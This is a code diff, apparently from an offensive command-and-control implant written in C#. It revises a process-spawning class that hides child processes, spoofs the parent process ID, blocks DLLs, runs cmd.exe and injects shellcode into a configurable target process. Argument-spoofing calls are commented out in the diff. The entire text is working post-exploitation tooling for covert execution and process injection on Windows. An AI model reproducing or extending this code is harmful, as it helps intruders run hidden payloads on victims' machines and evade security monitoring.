@@ -1,4 +1,7 @@
-﻿using Microsoft.Win32.SafeHandles;
+﻿using Agent.Controllers;
+using Agent.Models;
+
+using Microsoft.Win32.SafeHandles;
 
 using System;
 using System.Diagnostics;
@@ -15,9 +18,9 @@ namespace Agent.Utilities
         readonly int PPID;
         readonly bool BlockDLLs;
 
+        string SpawnTo;
         string Command;
-        string FakeArgs;
-        string RealArgs;
+        string Arguments;
 
         #region Constants
         // STARTUPINFOEX members
@@ -38,67 +41,50 @@ namespace Agent.Utilities
         const uint CREATE_SUSPENDED = 0x00000004;
         #endregion
 
-        public SacrificialLamb(int PPID, bool BlockDLLs)
+        public SacrificialLamb(ConfigController Config)
         {
-            this.PPID = PPID;
-            this.BlockDLLs = BlockDLLs;
+            SpawnTo = Config.Get<string>(AgentConfig.SpawnTo);
+            PPID = Config.Get<int>(AgentConfig.PPID);
+            BlockDLLs = Config.Get<bool>(AgentConfig.BlockDLLs);
         }
 
-        public string Run(string Command, string FakeArgs, string RealArgs)
+        public string Run(string Command, string Arguments)
         {
-            this.Command = Command;
-            this.FakeArgs = Command + " " + FakeArgs;
-            this.RealArgs = Command + " " + RealArgs;
+            this.Command = null;
+            this.Arguments = string.Format("{0} {1}", Command, Arguments);
 
             var pi = Sacrifice(out IntPtr readPipe);
 
-            var mole = new TinkerTailor(pi, this.RealArgs);
-            mole.SpoofArgs();
+            //var mole = new TinkerTailor(pi, this.RealArgs);
+            //mole.SpoofArgs();
 
             return ReadFromPipe(pi, readPipe);
         }
 
-        public string Shell(string FakeArgs, string RealArgs)
+        public string Shell(string Arguments)
         {
-            this.Command = @"C:\Windows\System32\cmd.exe";
-            this.FakeArgs = FakeArgs;
-            this.RealArgs = RealArgs;
+            Command = @"C:\Windows\System32\cmd.exe";
+            this.Arguments = Arguments;
 
             var pi = Sacrifice(out IntPtr readPipe);
 
-            var mole = new TinkerTailor(pi, this.RealArgs);
-            mole.SpoofArgs();
+            //var mole = new TinkerTailor(pi, this.RealArgs);
+            //mole.SpoofArgs();
 
             return ReadFromPipe(pi, readPipe);
         }
 
-        public string PowerShell(string FakeArgs, string RealArgs)
+        public void Inject(byte[] Shellcode)
         {
-            this.Command = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-            this.FakeArgs = FakeArgs;
-            this.RealArgs = RealArgs;
+            Command = SpawnTo;
+            
+            var pi = Sacrifice(out IntPtr _);
 
-            var pi = Sacrifice(out IntPtr readPipe);
-
-            var mole = new TinkerTailor(pi, this.RealArgs);
-            mole.SpoofArgs();
-
-            return ReadFromPipe(pi, readPipe);
-        }
-
-        public string Inject(string SpawnTo, string FakeArgs, byte[] Shellcode)
-        {
-            this.Command = SpawnTo;
-            this.FakeArgs = FakeArgs;
-            var pi = Sacrifice(out IntPtr readPipe);
-
-            var mole = new TinkerTailor(pi, this.RealArgs);
-            mole.SpoofArgs();
+            //var mole = new TinkerTailor(pi, this.RealArgs);
+            //mole.SpoofArgs();
 
             var needle = new Needle(pi);
             needle.Inject(Shellcode);
-
-            return ReadFromPipe(pi, readPipe);
         }
 
         PROCESS_INFORMATION Sacrifice(out IntPtr readPipe, bool CreateSuspended = false)
@@ -219,11 +205,11 @@ namespace Agent.Utilities
 
                 Kernel32.CreateProcess(
                     Command,
-                    FakeArgs,
+                    Arguments,
                     ref ps,
                     ref ts,
                     true,
-                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
+                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                     IntPtr.Zero,
                     null,
                     ref siEx,
